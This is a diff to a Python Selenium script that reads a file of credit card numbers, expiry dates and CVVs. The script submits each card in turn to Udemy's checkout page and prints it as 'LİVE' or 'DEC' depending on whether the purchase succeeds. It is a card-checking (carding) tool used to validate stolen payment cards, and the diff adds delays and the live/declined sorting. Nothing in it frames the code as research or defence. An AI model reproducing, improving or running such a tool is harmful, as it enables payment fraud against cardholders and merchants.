@@ -19,7 +19,7 @@ import string
 from time import sleep
 
 def funct():
-    CCList = open(r'/var/cc.txt', "r", encoding="utf8").read().splitlines()
+    CCList = open(r'/home/kali/Masaüstü/Register User/cc.txt', "r", encoding="utf8").read().splitlines()
     kartlar = []
 
     for i in CCList:
@@ -40,7 +40,7 @@ profile.set_preference("general.useragent.override", user_agent)
 options = webdriver.FirefoxOptions()
 options.headless = False
 driver = webdriver.Firefox(profile, options=options)
-wait = WebDriverWait(driver, 10, poll_frequency=1)
+wait = WebDriverWait(driver, 26, poll_frequency=1)
 print('Starting ..')
 driver.delete_all_cookies()
 driver.get("https://www.udemy.com/join/signup-popup/?locale=en_US&response_type=html&next=https%3A%2F%2Fwww.udemy.com%2F")
@@ -71,27 +71,30 @@ for (cc, mm, yy, cvv) in kartlar:
     wait.until(
      EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div[2]/div/div/div/div[2]/form/div[1]/div/div[3]/div/div[3]/div/div/div[2]/div/div[2]/div/div/input'))
     ).clear()
-
+    sleep(0.5) 
     wait.until(
      EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div[2]/div/div/div/div[2]/form/div[1]/div/div[3]/div/div[3]/div/div/div[2]/div/div[2]/div/div/input'))
     ).send_keys(cc)    
     kart = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div/div/div[2]/form/div[1]/div/div[3]/div/div[3]/div/div/div[2]/div/div[2]/div/div/input')
     driver.find_element(By.CSS_SELECTOR, ".checkout--sc-card__expiry-month--38hv9 .form-control").click()
     aysec = driver.find_element(By.CSS_SELECTOR, ".checkout--sc-card__expiry-month--38hv9 .form-control")
+    sleep(0.5)
     aysec.find_element(By.XPATH, "//option[. = '"+mm+"']").click()
+    sleep(0.5)
     yilsec = driver.find_element(By.CSS_SELECTOR, ".checkout--sc-card__expiry-year--__q-v .form-control")
-    yilsec.find_element(By.XPATH, "//option[. ='"+yy+"']").click()
+    yilsec.find_element(By.XPATH, "//option[. = '"+yy+"']").click()
+    sleep(0.5)
     driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div/div/div[2]/form/div[1]/div/div[3]/div/div[3]/div/div/div[2]/div/div[3]/div[2]/div/input').clear()
     wait.until(
     EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div[2]/div/div/div/div[2]/form/div[1]/div/div[3]/div/div[3]/div/div/div[2]/div/div[3]/div[2]/div/input'))
     ).send_keys(cvv) 
     driver.find_element(By.CSS_SELECTOR, '#udemy > div.main-content-wrapper > div.main-content > div > div > div > div.container.styles--shopping-container--A136v > form > div.styles--checkout-pane-outer--1syWc > div > div.styles--button-slider--2IGed.styles--checkout-slider--1ry4z > button').click()  
-    sleep(5)
-    print('Kart no : ',cc)
-    print(EC.presence_of_element_located((By.CSS_SELECTOR, ".checkout--error--2RoAR > .checkout--right-col--1y9nm > span")).text)
-
-
-    
+    sleep(3)
+    hata1 = ("We couldn't complete this purchase. Please try again.")
+    if 'Siparişiniz için çok teşekkür ederiz' in driver.page_source:
+          print("LİVE KART NO"," :", cc,"|",mm,"|",yy,"|",cvv,)
+    elif ("We couldn't complete this purchase. Please try again.") in driver.page_source: 
+          print("DEC KART"," :", cc,"|",mm,"|",yy,"|",cvv,)    
 
 
 
